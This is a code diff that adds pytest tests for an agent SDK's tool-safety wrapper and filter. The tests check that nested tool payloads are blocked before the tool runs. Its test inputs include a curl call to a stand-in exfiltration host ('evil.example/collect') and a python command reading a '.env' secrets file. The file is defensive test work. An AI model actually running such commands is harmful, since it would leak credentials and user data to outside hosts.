@@ -1,5 +1,8 @@
+from unittest.mock import Mock
+
 import pytest
 
+from trpc_agent_sdk.tools.safety import ToolSafetyFilter
 from trpc_agent_sdk.tools.safety import with_tool_safety
 
 
@@ -58,3 +61,79 @@ def test_wrapper_scans_interpreter_command_args():
     result = wrapped(command="python", command_args=["-c", "open('.env').read()"])
     assert not called
     assert result["error"] == "SAFETY_GUARD_BLOCKED"
+
+
+def test_wrapper_blocks_nested_network_payload_before_call():
+    called = False
+
+    def target(**payload):
+        nonlocal called
+        called = True
+        return {"success": True, "payload": payload}
+
+    wrapped = with_tool_safety(target, language="bash")
+    result = wrapped(payload={"tool_input": {"cmd": "curl", "args": ["https://evil.example/collect"]}})
+
+    assert not called
+    assert result["error"] == "SAFETY_GUARD_BLOCKED"
+    assert result["safety_report"]["decision"] == "deny"
+
+
+def test_wrapper_blocks_nested_python_command_args_before_call():
+    called = False
+
+    def target(**payload):
+        nonlocal called
+        called = True
+        return {"success": True, "payload": payload}
+
+    wrapped = with_tool_safety(target, language="bash")
+    result = wrapped(payload={"input": {"command": "python", "command_args": ["-c", "open('.env').read()"]}})
+
+    assert not called
+    assert result["error"] == "SAFETY_GUARD_BLOCKED"
+
+
+def test_wrapper_allows_nested_safe_payload():
+    called = False
+
+    def target(**payload):
+        nonlocal called
+        called = True
+        return {"success": True, "payload": payload}
+
+    wrapped = with_tool_safety(target, language="bash")
+    result = wrapped(payload={"tool_input": {"cmd": "echo", "args": ["ok"]}})
+
+    assert called
+    assert result["success"] is True
+
+
+def test_wrapper_scans_mcp_like_params_arguments():
+    called = False
+
+    def target(**payload):
+        nonlocal called
+        called = True
+        return {"success": True, "payload": payload}
+
+    wrapped = with_tool_safety(target, language="bash")
+    result = wrapped(params={"arguments": {"cmd": "curl", "args": ["https://evil.example/collect"]}})
+
+    assert not called
+    assert result["error"] == "SAFETY_GUARD_BLOCKED"
+
+
+@pytest.mark.asyncio
+async def test_filter_and_wrapper_match_nested_payload_decision():
+    payload = {"params": {"arguments": {"cmd": "curl", "args": ["https://evil.example/collect"]}}}
+
+    filter_result = await ToolSafetyFilter().run(Mock(), payload, lambda: {"success": True})
+
+    def target(**kwargs):
+        return {"success": True, "payload": kwargs}
+
+    wrapper_result = with_tool_safety(target, language="bash")(**payload)
+
+    assert filter_result.rsp["safety_report"]["decision"] == wrapper_result["safety_report"]["decision"]
+    assert filter_result.rsp["safety_report"]["decision"] == "deny"
